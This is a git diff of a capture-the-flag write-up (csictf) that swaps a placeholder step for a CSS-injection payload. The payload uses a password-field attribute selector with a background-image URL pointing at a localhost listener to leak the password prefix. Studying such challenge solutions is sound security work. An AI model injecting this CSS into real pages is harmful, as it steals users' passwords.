@@ -19,11 +19,13 @@ Wow that's a pretty color! Don't you think?
 
 ## Exploit
 
-<!-- Much more detailed description than the following. -->
-Reverse `sample.py` to decrypt the flag in `sample.txt.`
+Payload:
 <br />
 
-The last line should be the flag.
+```
+blue;} input[type="password"][value^="csictf"] {background-image: url('http://localhost:8000?csictf');
+```
+
 <br />
 
 The flag is:
